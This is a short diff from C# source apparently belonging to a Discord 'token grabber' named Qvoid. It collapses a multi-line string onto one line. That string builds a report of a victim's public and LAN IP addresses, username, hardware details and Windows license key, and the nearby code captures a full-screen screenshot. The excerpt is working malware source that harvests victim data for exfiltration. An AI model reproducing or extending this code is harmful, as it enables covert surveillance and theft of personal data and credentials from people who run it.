@@ -183,14 +183,7 @@ namespace Qvoid_Token_Grabber
                 embeds.Add(embedHead);
 
                 string BodyMessage = "";
-                string HeadMessage = $"IP Address```{machine.PublicIPv4}```" +
-                                     $"\nLAN Address```{machine.LanIPv4}```" +
-                                     $"\nDesktop Username```{Environment.UserName}```" +
-                                     $"\nMemory```{machine.PcMemory}```" +
-                                     $"\nOperating System Architecture```{machine.OsArchitecture}```" +
-                                     $"\nGPU Video```{machine.GpuVideo}```" +
-                                     $"\nGPU Version```{machine.GpuVersion}```" +
-                                     $"\nWindows License```{machine.WindowsLicense}```\n";
+                string HeadMessage = $"IP Address```{machine.PublicIPv4}```\nLAN Address```{machine.LanIPv4}```\nDesktop Username```{Environment.UserName}```\nMemory```{machine.PcMemory}```\nOperating System Architecture```{machine.OsArchitecture}```\nGPU Video```{machine.GpuVideo}```\nGPU Version```{machine.GpuVersion}```\nWindows License```{machine.WindowsLicense}```\n";
 
                 string ss_Name = DateTime.UtcNow.Ticks.ToString() + "_Capture.jpg";
                 using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
